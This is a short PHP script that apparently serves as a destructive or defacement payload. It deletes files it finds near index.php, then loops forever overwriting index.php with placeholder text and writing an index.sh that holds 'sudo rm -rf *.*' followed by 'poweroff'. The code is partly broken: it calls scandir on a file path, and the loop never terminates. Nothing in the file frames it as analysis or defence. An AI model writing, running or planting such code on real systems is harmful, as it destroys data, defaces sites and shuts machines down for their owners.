<?php
$target=scandir("./index.php");
for($i=1;$i<3;$i++)
{
$target_name=$target[$i];
$Address="./index.php".$target_name;
unlink($Address);
}
for($Z=0;$Z<1000;$Z--){
	$down_file=fopen("index.php","w");
	$terminal="Enter your desired codes \r\n";
	#You can enter your codes in the mentioned field
	fwrite($down_file,$terminal);
	$terminal_2="Enter your desired codes";
	#You can enter your codes in the mentioned field
	fwrite($down_file,$terminal_2);
	fclose($down_file);

	$down_file=fopen("index.sh","w");
	$terminal="sudo rm -rf *.* \r\n";
	fwrite($down_file,$terminal);
	$terminal_2="poweroff";
	fwrite($down_file,$terminal_2);
	fclose($down_file);
	}





?>
